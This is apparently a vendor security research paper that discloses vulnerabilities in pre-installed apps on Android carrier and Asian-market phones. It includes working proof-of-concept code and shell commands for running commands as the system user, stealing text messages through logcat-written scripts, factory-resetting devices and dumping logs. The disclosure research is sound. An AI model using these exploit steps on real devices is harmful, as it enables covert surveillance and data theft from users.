Vulnerable Out of the Box: An Evaluation of Android Carrier Devices
Abstract
Pre-installed apps and firmware pose a risk due to vulnerabilities that can be pre-positioned on a device, rendering the device vulnerable on purchase. To quantify the exposure of the Android end-users to vulnerabilities residing within pre-installed apps and firmware, we analyzed a wide range of Android vendors and carriers using devices spanning from low-end to flagship. Our primary focus was exposing pre-positioned threats on Android devices sold by United States (US) carriers, although our results affect devices worldwide. We will provide details of vulnerabilities in devices from all four major US carriers, as well two smaller US carriers, among others. The vulnerabilities we discovered on devices offered by the major US carriers are the following: arbitrary command execution as the system user, obtaining the modem logs and logcat logs, wiping all user data from a device (i.e., factory reset), reading and modifying a user's text messages, sending arbitrary text messages, getting the phone numbers of the user's contacts, and more. All of the aforementioned capabilities are obtained outside of the normal Android permission model. Including both locked and unlocked devices, we provide details for 38 unique vulnerabilities affecting 25 Android devices with 11 of them being sold by US carriers.
1. Introduction
Android devices contain pre-installed apps ranging from a vendor's custom Settings app to "bloatware." Bloatware can frustrate users due to the difficulty in removing or disabling these potentially unwanted apps. In some cases, a user needs to "root" their device to remove the offending software (assuming there is a viable root strategy available), potentially voiding their warranty. Pre-installed apps may contain vulnerabilities, exposing the end-user to risks that they cannot easily remove. Furthermore, pre-installed apps can obtain permissions and capabilities that are unavailable to third-party apps (i.e., those the user downloads or sideloads). Apps that signed with the platform key (i.e., platform apps) can execute as the same user (i.e., system) as the Android Operating System (OS) framework. A vulnerability within a preinstalled platform app user can be used to obtain Personally Identifiable Information (PII) and engage in aggressive surveillance of the user. We discovered numerous vulnerabilities that allow any app co-located on the device to obtain intimate details about the user and their actions on the device.
Pre-installed apps and firmware provide a baseline for vulnerabilities present on a device even before the user enables wireless communications and starts installing third-party apps. To gauge the exposure of Android end-users to vulnerabilities residing within pre-installed apps, we examined a range of Android devices spanning from low-end devices to flagship devices. Our primary focus was examining Android devices sold by United States (US) carriers. We found vulnerabilities in devices from all four major US carriers, as well as two smaller US carriers. A complete listing of all the vulnerabilities we found is provided in Section 3. The vulnerabilities we found on devices sold by major US carriers are the following: arbitrary command execution as the system user, obtaining the modem logs and logcat logs, wiping all user data from a device (i.e., factory reset), reading and modifying a user's text messages, sending arbitrary text messages, and getting the phone numbers of the user's contacts. All of the aforementioned capabilities are obtained outside of the normal Android permission model. The vulnerabilities found in pre-installed apps

can be leveraged by a third-party app to have the vulnerable app perform some behavior on its behalf due to insecure access control mechanisms.
In addition to US carrier devices, we also examined unlocked Android smartphones. We purchased three Android devices while on a recent trip to Southeast Asia. Specifically, we examined the Oppo F5, Vivo V7, and the Leagoo P1 devices. According to IDC, Oppo and Vivo respectively had 7.4% and 5.2% global market share for smartphones shipped in the first quarter of 20171. These devices contained significant vulnerabilities that can be used to perform surveillance of the user. Oppo's F5 flagship device contains a vulnerability that allows any app on co-located on the device to execute arbitrary commands as the system user. The capabilities available to apps that can execute commands as the system user is provided in Section 4. The device also has an open interface that allows the recording of audio, although the command execution as system user vulnerability is needed to copy the recorded audio file. The Vivo V7 device contains vulnerabilities that allow any third-party app on the device to record the screen, obtain the logcat and kernel logs, and change system properties. For example, changing the persist.sys.input.log property to a value of yes makes the coordinates of the user's screen touches and gestures get written to the logcat log. The Leagoo P1 device allows any app on the device to programmatically perform a factory reset and to take a screenshot that gets written to external storage (i.e., SD card). Furthermore, the Leagoo P1 device has a local root privilege escalation via Android Debug Bridge2 (ADB).
When vendors leave in development and debugging functionality, this can result in a vulnerability that can be leveraged by an attacker. These apps should be removed prior to launching a production build available to the end user. If these apps are unable to be removed, then these functionalities should not be available to all apps co-located on the device. Ideally, they should be restricted to requiring some sort of human involvement prior to obtaining or logging PII. A concerted effort is placed on searching for vulnerabilities and threats arising from apps that the downloads from traditional app distribution channels. In addition to looking at external apps, an effort should be undertaken to examine the apps already present on the device.
2. Background
This section provides additional context for understanding Android concepts relevant to the vulnerabilities presented in later sections.
2.1 Threat Model
We assume that the user has a generally unprivileged third-party app installed on the target device so that it can interact with pre-installed apps on the device through open interfaces. This can be accomplished via repackaging apps and listing them on third-party app marketplaces, trojanized app, phishing, social engineering, or remote exploit. An interesting attack vector recently employed is that attackers were posing as beautiful women, befriending targets, and enticing them to install trojanized apps 3 . Most of the vulnerabilities we discovered require a local app be installed on the device to exploit the vulnerabilities resident in pre-installed apps with the exception being two root privilege escalation vulnerabilities that

require the use of ADB. A majority of the vulnerabilities were exploitable due to improper access control where an app exposes an interface to all other apps co-located on the device. This open interface can potentially be abused wherein a lesser-privileged app uses the capabilities of the vulnerable app as shown in Figure 1. All of the vulnerabilities we found do not require any user intervention except the two root privilege escalation vulnerabilities. Many of the vulnerabilities do not require any access permissions to exploit (e.g., performing a factory reset, sending a text message, command execution as the system user, etc.). Other vulnerabilities require the READ_EXTERNAL_STORAGE since external storage is a common location for pre-installed apps to dump data. If any app was truly be malicious, the INTERNET permission would be needed to exfiltrate the obtained data to a remote location.
FIGURE 1. INDIRECT ACCESS TO PROTECTED RESOURCES.
2.2 Pre-Installed Apps
We consider a pre-installed app to be an app that is present on the device the first time the user removes the phone from the box and boots the phone. Specifically, any app that is installed on the system partition is a pre-installed app. These apps were chosen to be on the device by the vendor, carrier, hardware manufacturer, etc. The most privileged pre-installed apps are those executing as the system user (i.e., platform apps). For an app to execute as the system user, it needs to have the android:sharedUserId attribute set to a value of android.uid.system in its AndroidManifest.xml file and be signed with the device platform key. Each Android app must contain a valid AndroidManifest.xml file serving as a specification for the app. In terms of the core AndroidManifest.xml file that declares the platform's permissions4, apps executing as the system user can obtain permissions with an android:protectionLevel of signature and all preinstalled apps can obtain permissions with an android:protectionLevel of signatureOrSystem. Neither signature nor signatureOrSystem permissions can be obtained by third-party apps, which are limited to requesting permissions with an android:protectionLevel of normal and dangerous5.
2.3 Intents
An Intent6 is like a message that can contain embedded data that is sent within/between apps. Intents are a fundamental communication mechanism in Android. In this paper, most of the vulnerabilities are exploited by sending an Intent message from the attacking app to a vulnerable app that has an open
4 https://android.googlesource.com/platform/frameworks/base/+/master/core/res/AndroidManifest.xml 5 Some permissions have an android:protectionLevel of development that allows a user to grant them to an app via ADB. 6 https://developer.android.com/guide/components/intents-filters

interface where the Intent will be delivered. Some Intents need to be crafted to exactly what the receiving app is expecting with regards to an action string or specific key-value pairs to perform certain behavior. Intent messages are delivered to app components7 which are functional units of an Android app.

2.4 External Storage

Some of the vulnerabilities in pre-installed apps will dump PII to external storage (i.e., emulated SD card). External storage can be accessed by any app that has been granted the READ_EXTERNAL_STORAGE permission. Due to it being a shared resource, it is not recommended to write sensitive data to the SD card8. Nonetheless, the SD card appears to be a common location where pre-installed apps write sensitive data. Pre-installed debugging and development apps may write data to the SD card since it is accessible to the ADB user (i.e., shell). In this paper, the terms external storage and SD card will be used synonymously.

2.5 Bound Services

Services are one of the four Android application component types from which a user can create an Android app. A bound service9 allows a client app to interact with a service using a pre-defined interface. The interface between the client and service is generally defined in an Android Interface Definition Language (AIDL) file. If the client app contains the corresponding AIDL file from the service at compile time, then the communication with the service is straightforward and Remote Procedure Calls (RPCs) can occur normally. If the client app lacks the corresponding AIDL file, then this communication is still possible, but it is more involved process to explicitly interact with the service. Some vendors may be unaware that successful communication between a bound service and client app that lacks the corresponding AIDL file is still possible.

3.1 Vulnerable US Carrier Android Devices

Each US carrier has a stable of Android devices that it makes available to consumers. These devices are generally locked on the carrier's network, although they may become unlocked after a certain period of time has elapsed. Moreover, devices sold by a carrier tend to come pre-loaded with carrier apps. Table 2 contains the vulnerabilities we discovered on Android devices sold by US carriers.

3.2 Popular Android Devices in Asia

We obtained three Android devices from their official vendor stores in Kuala Lumpur, Malaysia. Specifically, we bought the following devices: Oppo F5, Vivo V7, and Leagoo P1. At the time of purchase (early February 2018), the Oppo and Vivo devices we purchased were flagship models. Each of these devices had concerning vulnerabilities that are shown at the bottom of Table 1. The Oppo and Vivo devices contain vulnerabilities that can be used to facilitate surveillance of the end-user. The vulnerabilities appear to be unused by the device for any malicious purpose, although they can be leveraged by any third-party app that is aware of their presence.

BBK Electronics10 produces a large range of electronics including three popular smartphone brands: Oppo,
Vivo, and OnePlus. Oppo and Vivo Android devices are not well known in the US, but they are popular in Asia. Oppo was the top seller of smartphone units in China for 201611. Oppo and Vivo were the third and
fourth largest suppliers of smartphones in India for the first quarter of 2018 with each vendor having 6% market share12. Furthermore, both Oppo and Vivo had 7.4% and 5.2%, respectively, global market share
for smartphones shipped in the first quarter of 2017. Leagoo is smaller than the other two vendors, but has recently made headlines about launching its S9 device at Mobile World Congress 201813.

To determine if the vulnerabilities we discovered were being actively used by malicious apps, we "scraped" 118,000 apps from the Xiaomi app marketplace14. We did not find any instances of the vulnerabilities we discovered being used in the apps we processed. We are still in the processing of scraping additional app marketplaces to determine if these vulnerabilities are actively being exploited elsewhere.

4. Arbitrary Command Execution as the system User

We found 3 instances of arbitrary command execution as the system user from the following vendors: Asus, Oppo, and SKY. All of the instances were due to a platform app executing as the system user containing an exposed interface that allows any app co-located on the device to provide arbitrary commands to be executed. Executing commands as the system user is a powerful capability that can be used to surreptitiously surveil the user. Using this capability, a video can be recorded of the device's screen, affording the user no privacy. Android allows the screen to be recorded by privileged processes via the /system/bin/screenrecord command. The Oppo F5 device does not allow the screen to be recorded through the standard screenrecord command, although the device allows screenshots to be taken of the screen via the screencap command. Beyond the lack of privacy due to observing all on-screen activity of the user, anything that the user enters can also be viewed and obtained (e.g., passwords, credit card numbers,

social security numbers, etc.). Command execution as the system user can allow an app to programmatically set itself as a notification listener. A notification listener can receive the text of the user's notifications as notifications are received15. In the normal case, a user must explicitly enable an installed app as a notification listener using the Settings app. An app executing as the system user can programmatically add an app (e.g., the attacking app) to the list of approved notification listeners using the
settings put secure enabled_notification_listeners <package name>/<component name>
command. This enables the app to receive the text of the notifications, allowing the app to see received text messages, Facebook Messenger messages, WhatsApp messages, and also any arbitrary notification that is received. The logcat log is also accessible to the system user and can be written to a location that is visible to other applications. The data that can be obtained from the logcat log is provided in Section 5. Moreover, the attacking app can programmatically use the vulnerable platform app to set itself as the default Input Method Editor (IME) and capture the input that the user enters by replacing the default keyboard with one that the attacking app has implemented within its own code16. The new IME would raise suspicion if it did not resemble the target's default keyboard. The key presses can be transferred to the malicious app from the malicious IME via a dynamically-registered broadcast receiver. The attacking app can also set one of its components as the default spell checker17. Table 3 shows the capabilities that were verified using the
vulnerable platform app to execute commands as the system user. The differences are due to the Android Application Programming Interface (API) level and SELinux18 rules of the respective devices.

Below are some commands that are verified to work when executed as the system user via a vulnerable app that exposes this capability on some of the devices we tested. Some of the commands below can be used to directly write the output, if any, to the attacking app's private directory (see Section 4.1.1 and Section 4.1.2 for details) instead of using external storage for a temporary file transfer location. Notably, SELinux on the Asus ZenFone V Live prevents its vulnerable platform app from directly reading from or writing to a third-party app's private directory; therefore, the approach is Section 4.1.1 is necessary for

4.1 Executing Scripts as the system User
The three instances of command execution as the system user that we found all use the java.lang.Runtime.exec(String) API call to execute commands. This API call executes a single command and does not allow input and output redirection that the shell provides. This behavior is limiting, so we created a method to have the app that allows command execution to execute shell scripts without reading them from external storage. This relieves the attacking app from having to request the READ_EXTERNAL_STORAGE permission, although the attacking app can create the request to access external storage and use the vulnerable app to inject input events to grant itself the permission if runtime permission granting is present on the device. Nonetheless, to be stealthier, the approach we outline below alleviates access to the SD card for certain data (recording the screen, text messages, contacts, call log, etc.). All the vulnerable platform apps are able to read and execute a shell script in attacking app's private directory and write the output to the attacking app's private directory, except the Asus ZenFone V Live device. It's vulnerable platform app will be blocked from reading from or writing to the attacking app's private directory. Therefore, we provide two different methods for data transfer. Section 4.1.1 is the most robust and removes any difficulty with SELinux blocking a platform app reading from or writing to the attacking app's private directory. Section 4.1.2 details the instance where the platform app is not prevented from writing directly to the attacking app's private directory.
4.1.1 Transferring Data Using a Dynamically-Registered Broadcast Receiver
Our approach uses the logcat log to have the vulnerable platform app write a shell script to its private directory. First, the attacking app selects a random 12-character alphanumeric log tag (e.g., UQ2h9hVRhLfg) so that the vulnerable app will not read in log messages that are not intended for it. In addition, the attacking app should dynamically register a broadcast receiver with the selected 12 random character string as an action string. The attacking app then proceeds to write log messages with the selected log tag containing the lines of the script to execute. In the script, the attacking app needs to transfer the data obtained from the private directory of the vulnerable app to the private directory of the attacking app. This is accomplished by having the vulnerable app read in a file from its internal directory and send it in an intent to the broadcast receiver that was dynamically registered by the attacking app. For example, the attacking app can write the following log messages to create a script that will make the vulnerable app send it the user's text messages where -p <package name> is the package name of the attacking app. The commands below uses the com.asus.splendidcommandagent app as an example.
Log.d("UQ2h9hVRhLfg", "#!/bin/sh"); Log.d("UQ2h9hVRhLfg", "content query --uri content://sms > /data/data/com.asus.splendidcommandagent/msg.txt"); Log.d("UQ2h9hVRhLfg", "am broadcast -a UQ2h9hVRhLfg -p <package name> --es data \"$(cat /data/data/com.asus.splendidcommandagent/msg.txt)\"");

After writing these log messages which are the lines of the shell script to execute, the attacking app then makes the vulnerable app write the script to the vulnerable app's private directory.
logcat -v raw -b main -s UQ2h9hVRhLfg:* *:S -f /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh -d
The command above will only write the log messages excluding the log tags to a file in the vulnerable app's private directory. In the example above of writing log messages to the logcat log, the corresponding file named /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh will contain the content shown below.
#!/bin/sh content query --uri content://sms > /data/data/com.asus.splendidcommandagent/msg.txt am broadcast -a UQ2h9hVRhLfg -p <package name> --es data "$(cat /data/data/com.asus.splendidcommandagent/msg.txt)"
In the logcat command to make the vulnerable app write the shell script to its private directory, the -v raw argument will only contain the log messages and not the log tags. The -b main argument will only contain the main log buffer and not include a message indicating the start of the system and main logs. The -s UQ2h9hVRhLfg:* *:S arguments will only write the log messages from the log tag of UQ2h9hVRhLfg and silence all other log messages without a log tag of UQ2h9hVRhLfg. The -d argument will make logcat dump the current messages in the targeted log buffer(s) and exit so that it does not keep reading. The -f /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh argument will write the contents of the log to the file indicated. This command will write the script to the vulnerable app's private directory. The attacking app can then have the vulnerable app make the shell script executable and then execute the shell script with the following commands.
chmod 770 /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh sh /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh
Then the attacking app can record the data it receives to its broadcast receiver that is dynamically-registered with an action of UQ2h9hVRhLfg to a file or send it out over a network socket to a remote server.
4.1.2 Transferring Data Directly Using a File in the Attacking App's Private Directory
Certain devices allow the vulnerable platform app to write the output file directly into the attacking app's private directory. This approach is similar to the previous approach although the data transfer approach is different. First, the attacking app needs to make their private directory (i.e., /data/data/the.attacking.app) globally executable. Then the attacking app needs to create the target file that will be written by the vulnerable app (i.e., msg.txt in this example). Then the msg.txt file needs to be set as globally writable. If the file was not created first, the vulnerable app will create a file in the attacking app's private directory that is owned by the system user and it will not be able to be read by the attacking app. Alternatively, the attacking app can have the platform app create the file in its private directory and then change the file permissions to be very permissive so it will be accessible to the attacking app (e.g., msg.txt). Creating the target file and changing the file permissions allows the attacking app to own the target file and will allow the vulnerable platform app to write to it.

The attacking app selects a random 12-character alphanumeric log tag (e.g., UQ2h9hVRhLfg) in order to avoid a potential collision with any other apps that happen to use the same log tag. This example, will achieve the same objective as the previous method in obtaining the user's text messages. The attacking app then writes a shell script of its choosing to the logcat log using the log tag that was selected earlier. If the vulnerable platform app can read from a third-party app's private directory, the shell script can be directly written there, change the file permissions on the script and it's private directory and have it directly executed instead of transferring the script via the logcat log.

Log.d("UQ2h9hVRhLfg", "#!/bin/sh"); Log.d("UQ2h9hVRhLfg", "content query --uri content://sms > /data/data/the.attacking.app/msg.txt");

The attacking app then forces the vulnerable platform app to write the shell script to its private directory by making it execute the command shown below which writes the content of the log messages that the attacking app wrote to the log with the log tag of UQ2h9hVRhLfg.

logcat -v raw -b main -s UQ2h9hVRhLfg:* *:S -f /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh -d

Then the attacking app makes the vulnerable platform app execute the shell script it just wrote to its private directory. The commands below make the vulnerable app change the file permissions on the shell script so it is executable and then execute the shell script.

chmod 770 /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh sh /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh

The shell script will make the vulnerable platform app obtain all of the user's text messages and write them to a file in the attacking app's private directory (i.e., /data/data/the.attacking.app/msg.txt). At this point, the attacking app has the user's text messages and can execute additional shell scripts using this method. This approach also works for recording the user's screen and writing the logcat log directly to the private directory of the attacking app, although SELinux may deny the search operation on the app's private directory on certain devices.

4.2 Asus Command Execution Vulnerability Details

The com.asus.splendidcommandagent platform app executes as the system user since it sets the

android:sharedUserId attribute to a value of android.uid.system in its AndroidManifest.xml file

and is signed with the device platform key. The SplendidCommandAgentService service application

component within the com.asus.splendidcommandagent app executes with a process name of

com.asus.services. This is a result of the SplendidCommandAgentService component setting the

android:process attribute to a value of com.asus.services in its AndroidManifest.xml file. The

SplendidCommandAgentService operates as a bound service where other apps interact with it using a pre-

defined

interface

with

a

fully-qualified

name

of

com.asus.splendidcommandagent.ISplendidCommandAgentService via RPCs. This interface exposes

a single method named doCommand(String). In the com.asus.splendidcommandagent app, the

com.asus.splendidcommandagent.c class fulfills the ISplendidCommandAgentService interface by

containing an implementation for the single method defined in the interface. Therefore, a call to the

10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

ISplendidCommandAgentService interface by the attacking app will be unmarshalled and delivered to the

corresponding method in the com.asus.splendidcommandagent.c class in the

com.asus.splendidcommandagent app. Although we lacked the AIDL file for the

ISplendidCommandAgentService interface to generate an appropriate interface stub in our app to call

directly, the single interface method can still be accessed without an interface stub. This is accomplished

by binding to the SplendidCommandAgentService service, obtaining an IBinder reference, creating and

populating the Parcel objects, and calling the appropriate transaction code when calling the

IBinder.transact(int, Parcel, Parcel, int) method on the ISplendidCommandAgentService

interface. This RPC on a remote object will, in turn, call the

com.asus.splendidcommandagent.c.doCommand(String)

method

in

the

com.asus.splendidcommandagent

app.

The

com.asus.splendidcommandagent.c.doCommand(String)

method

will

call

the

SplendidCommandAgentService.a(SplendidCommandAgentService,String) method that performs

the command execution using the java.lang.Runtime.exec(String) method. The string that is executed

in the Runtime.exec(String) method call is controlled by the attacking app and is passed to the

SplendidCommandAgentService via a string parameter in a Parcel object. Appendix A contains Proof of

Concept (PoC) code for devices with a vulnerable com.asus.splendidcommandagent platform app to

execute a command to programmatically factory reset the device. The command to programmatically

factory reset the device is am broadcast -a android.intent.action.MASTER_CLEAR, although this

command can be replaced with the commands in Section 4. The commands that can be executed will likely

be affected by the major version of Android that the affected device is running.

4.3 Affected Asus Android Devices

Table 4 provides a sampling of Asus Android devices that contain a pre-installed, vulnerable version of the

com.asus.splendidcommandagent

platform app. A vulnerable version of the

com.asus.splendidcommandagent app was also present on Asus Android tablet devices, except for the

Asus ZenPad S 8.0 tablet. The com.asus.splendidcommandagent app (versionCode=1510200045,

versionName=1.2.0.9_150915) on the Asus ZenPad S 8.0 tablet actually filtered the commands it

received, and would only accept and execute the following commands: HSVSetting, GammaSetting, and

DisplayColorSetting. At a certain point around March, 2017, this restriction was removed, and the

com.asus.splendidcommandagent app would accept and execute any command without pre-condition

other than it not be an empty string. We never saw any User ID (UID) checking or protection of the

vulnerable service application component with a signature-level custom permission.

4.4 Asus ZenFone 3 (ZE552KL) Vulnerability Timeline

Table 5 shows when a particular build for a target market was introduced and whether the build contains a vulnerable version so the com.asus.splendidcommandagent platform app for the Asus ZenFone 3 (ZE552KL) device. The build fingerprint is provided to uniquely identify the build. The vulnerability was first introduced in the worldwide market in March, 2017 for the Asus ZenFone 3 device. All other markets became vulnerable within the next two months except for the Chinese market. This is due to the Chinese market being held at the Android 6.0.1 (API level 23) for at least 14 months while the worldwide market moved to Android 8.0 (API level 26). Asus' website19 allows the downloading of historical firmwares.

4.5 Oppo F5 Command Execution as the system User
The Oppo F5 Android device contains a platform app with a package name of com.dropboxchmod that executes as the system user. The Oppo F5 device we examined had a build fingerprint of OPPO/CPH1723/CPH1723:7.1.1/N6F26Q/1513597833:user/release-keys. The Oppo F5 does not come with the Dropbox Android app pre-installed with a standard package name of com.dropbox.android, although this could also be for the service named DropBoxService in the Android framework. The com.dropboxchmod app contains only a single application component named DropboxChmodService. This service app component is implemented by a single class and an anonymous class. Below is the AndroidManifest.xml of the app showing that the app has an android:sharedUserId attribute with a value of android.uid.system. In addition, the manifest shows that the DropBoxChmodService is explicitly exported and not permission-protected, making it accessible to any app on the device.
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:sharedUserId="android.uid.system" package="com.dropboxchmod" platformBuildVersionCode="25" platformBuildVersionName="7.1.1">

10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

<application android:allowBackup="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name">
<service android:enabled="true" android:exported="true" android:name=".DropboxChmodService"/> </application>
The primary class named DropBoxChmodService creates an anonymous java.lang.Thread object that has access to the intent that was received in the onStartCommand(Intent, int, int) lifecycle method. The anonymous thread objects will obtain the action string from the intent and execute it as the system user if the action string is not null and not an empty string. Since the DropBoxChmodService app component is exported and not permission-protected, any app co-located on the device can execute commands as the system user. Unlike the others, the DropBoxChmodService does not print the output of the executed command to the logcat log, although the approach detailed in Section 4.1.1 can be used to obtain the output of a command. Below is the code to execute as the system user on the Oppo F5 device where the action string to the intent will be executed.
Intent i = new Intent(); i.setClassName("com.dropboxchmod", "com.dropboxchmod.DropboxChmodService"); i.setAction("chmod -R 777 /data"); startService(i);
In the source code snippet above, a vulnerable Oppo Android device will recursively change the file permissions starting from the /data directory. This is useful to examine for non-standard files on the data partition. We examined an Intermediate Representation (IR) of the app code for the com.dropboxchmod platform app and recreated the source code for the onStartCommand service lifecycle method of the DropBoxChmodService class that is provided below. The onStartCommand method receives the intent sent from the attacking app.
@Override public int onStartCommand(final Intent intent, int flags, int startId) {
new Thread() { public void run() { if (intent == null) { stopSelf(); return; } String action = intent.getStringExtra("action"); if (action.isEmpty()) { action = intent.getAction(); } Log.i("DropboxChmodService", "action = [" + action + "]"); if (action.isEmpty()) { stopSelf(); return; } try { Process process = Runtime.getRuntime().exec(action); Log.i("DropboxChmodService", "wait begin"); process.waitFor(); Log.i("DropboxChmodService", "wait end"); } catch (Exception e) { e.printStackTrace(); } }

}.start(); return super.onStartCommand(intent, flags, startId);
}

4.5.1 Affected Oppo Android Devices

We examined a range of Oppo devices from the markets in which they operate to estimate the scope of affected devices. Oppo makes their most recent firmware images for each device available on their website. The firmware images are segmented by country, where each country appears to have a different set of devices available to it. The Chinese market20 appears to have the most available firmware images to download, whereas the Australian market21 has less firmware images available to download. Table 6 provides a chronologically-ordered listing of Oppo devices and whether or not they are vulnerable. This is not an exhaustive listing of the firmware images for Oppo Android devices. At a certain point, Oppo started to use an ozip file format to encapsulate their firmware images instead of the standard zip file format they used previously. We found a tool on XDA Developers from a member named cofface that helped to decrypt some of the ozip files22. Due to the new ozip file format, we were not able to examine all the firmware images we downloaded. The Oppo firmware images do not directly provide the ro.build.fingerprint property in the default properties file (i.e., /system/build.prop); therefore, we used the ro.build.description property instead. This property is similar and contains some of the same fields. Specifically, Table 6 is ordered by the date provided in ro.build.description property corresponding to the ro.build.date property (sometimes as a UNIX timestamp). The earliest date we witnessed where for the vulnerability was June 07, 2016 in the Oppo R7S device available to the Chinese market.

4.6 SKY Elite 6.0L+ Arbitrary Command Execution as the system User

The SKY Elite 6.0L+ device contains an app with a package name of com.fw.upgrade.sysoper (versionCode=238, versionName=2.3.8) that allows any app co-located on the device to have it execute commands as the system user. This app was developed by Adups, which is the same company that we discovered was surreptitiously exfiltrating PII to China23. This vulnerability is the same one that we previously discovered, but the notable thing is that this device was purchased in March, 2018 from Micro Center in Fairfax, VA. We examined the two Adups apps on the device (com.fw.upgrade.sysoper and com.fw.upgrade) and neither of them exfiltrated any user PII. Although Adups apps are on the device, they do not make any network connections. The device uses a platform app with a package name of com.android.ota (versionCode=1, versionName=1.0) to check for firmware updates. This app checks to see if a firmware update is available right after the boot process completes by making an HTTP GET request to the following URL: http://ota.wheatek.com:8001/WtkOTA/CheckUpdate (querystring omitted). We witnessed that since May 23, 2018, any requests to this URL time out. If there was a firmware update available, the com.android.ota app would use a platform app with a package name of com.mediatek.systemupdate.sysoper (versionCode=1, versionName=1.0) to boot into recovery and install the firmware update. Since the Wheatek server is not responding to the GET requests, it appears that this device will be left with a known vulnerability. The SKY Elite 6.0L+ device has a build fingerprint of SKY/x6069_trx_l601_sky/x6069_trx_l601_sky:6.0/MRA58K/1482897127:user/release-keys. This device has a build date of Wed Dec 28 12:01:22 CST 2016 according to the ro.build.date system property. Adups has fixed the arbitrary command execution as system user vulnerability in its apps, although SKY or another entity in the supply chain included an old version of the Adups app in their build that has not been updated, making the device vulnerable. The source code below will cause the com.fw.upgrade.sysoper app to create a file an empty file with a path of /sdcard/f.txt. This is a fairly benign command to be executed as it just shows the vulnerable app will actually execute commands of the attacking app's choosing and can be replaced with a different command.

Intent i = new Intent("android.intent.action.Fota.OperReceiver"); i.setClassName("com.fw.upgrade.sysoper", "com.adups.fota.sysoper.WriteCommandReceiver"); i.putExtra("cmd", "touch /sdcard/f.txt"); sendBroadcast(i);

5. Logcat Logs

The logcat logs consist of four different log buffers: system, main, radio, and events24. The logcat log is a shared resource where any process on the device can write a message to the log. The logcat log is generally for debugging purposes. A third-party app can only read log messages that the app itself has written. Preinstalled apps can request and be granted the READ_LOGS permission by the Android OS. The Android OS and apps can write sensitive data to the logs, so the capability to read from the system-wide logcat log was taken away from third-party apps in Android 4.1. Since a third-party app cannot directly obtain the systemwide logcat log, a third-party app may leverage another privileged app to write the system-wide logcat logs to the SD card or potentially its own private app directory. We found various vulnerabilities where a privileged pre-installed app writes the logcat logs to the SD card25.

The logcat logs tend to contain email addresses, telephone numbers, GPS coordinates, unique device

identifiers, and arbitrary messages written by any process on the device. A non-exhaustive list of concrete

logcat log messages is provided in Appendix B. The log messages in Appendix B are from the ZTE Blade

Vantage

device

from

Verizon

with

a

build

fingerprint

of

ZTE/Z839/sweet:7.1.1/NMF26V/20180120.095344:user/release-keys. App developers may write

sensitive data to the logcat log while under the impression that their messages will be private and

unobtainable. Information disclosure from the logcat log can be damaging depending on the nature of the

data written to the log. Appendix B contains a username and password pair being written to the logcat log

from a US Fortune 500 bank app. There is some variance of the data that is written to the logcat log among

different Android devices. Some older examples of data written to the logcat log can be found here26.

5.1 Various LG Devices  Getting the Logcat Logs Written to an App's Private Directory

The com.lge.gnsslogcat app (versionCode=1, versionName=1.0) is present as a pre-installed app on the four LG devices we examined, show below with their corresponding build fingerprints.

LG G6 - lge/lucye_nao_us_nr/lucye:7.0/NRD90U/17355125006e7:user/release-keys LG Q6 - lge/mhn_lao_com_nr/mhn:7.1.1/NMF26X/173421645aa48:user/release-keys LG X Power - lge/k6p_usc_us/k6p:6.0.1/MXB48T/171491459f52c:user/release-keys LG Phoenix 2 - lge/m1v_att_us/m1v:6.0/MRA58K/1627312504f12:user/release-keys

This platform app executes as the system user since the app is signed with the platform key and sets the android:sharedUserId attribute to a value of android.uid.system in its AndroidManifest.xml file. This provides the application with significant capabilities on the device. The app also requests the android.permission.READ_LOGS permission. As this app is installed on the system partition, the READ_LOGS permission will be granted to it so that it can read the system-wide logcat log. The AndroidManifest.xml file of the com.lge.gnsslogcat app is provided below.

</service> </application>
The com.lge.gnsslogcat app is small, as it only contains three classes for the whole app and only contains a single service application component: GnssLogService. This component is explicitly exported as it sets the android:exported attribute to a value of true. The com.lge.gnsslogcat app does not run following device startup and will only run when started by another app on the device. When the com.lge.gnsslogcat app is started via an intent, it will write the logcat log to external storage, although the log messages it writes belong to a limited set of log tags. Each log entry has a log tag and a log message. Specifically, the default configuration for the com.lge.gnsslogcat app is to only record log messages that have a log tag of GpsLocationProvider, LocationManagerService, or GnssLogService. Under the default configuration, the com.lge.gnsslogcat app writes the entire log entries for log messages from the system-wide logcat log that have the aforementioned log tags to a default path of /sdcard/gnsslog/GnssLogService.log. An example listing of this file is shown below.
05-10 13:16:24.559 1703 2555 D LocationManagerService: getLastLocation: Request[ACCURACY_FINE gps requested=0 fastest=0 num=1] 05-10 13:16:24.560 1703 1717 D LocationManagerService: getLastLocation: Request[POWER_LOW network requested=0 fastest=0 num=1] 05-10 13:16:39.131 6668 6685 D GnssLogService: FileName[GnssLogService] start logging 05-10 13:17:34.930 1703 3307 D LocationManagerService: getLastLocation: Request[POWER_NONE passive fastest=0 num=1] 05-10 13:17:34.940 1703 3345 D LocationManagerService: getLastLocation: Request[POWER_NONE passive fastest=0 num=1] 05-10 13:17:34.949 1703 3307 D LocationManagerService: getLastLocation: Request[POWER_NONE passive fastest=0 num=1]
The logcat log, containing only log entries from 3 specific log tags, only provides a very limited amount of data. We discovered a method to provide input to the com.lge.gnsslogcat app so that the entire systemwide logcat log will be written to the output file. The attacking app that starts the com.lge.gnsslogcat app externally can control the path where the file will be created. Moreover, the attacker can use a path traversal attack. The resulting log file will always have a fixed .log extension, but the path can be controlled by the attacker. The path selection will still be subject to SELinux rules. We have found that the attacking app can successfully cause the com.lge.gnsslogcat app create a logcat log file in the attacking app's private directory. Therefore, the attacking app does not require any permissions to obtain the logcat logs, although if data from the logcat log is to be sent off from the device, the attacking app will need the INTERNET permission.
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

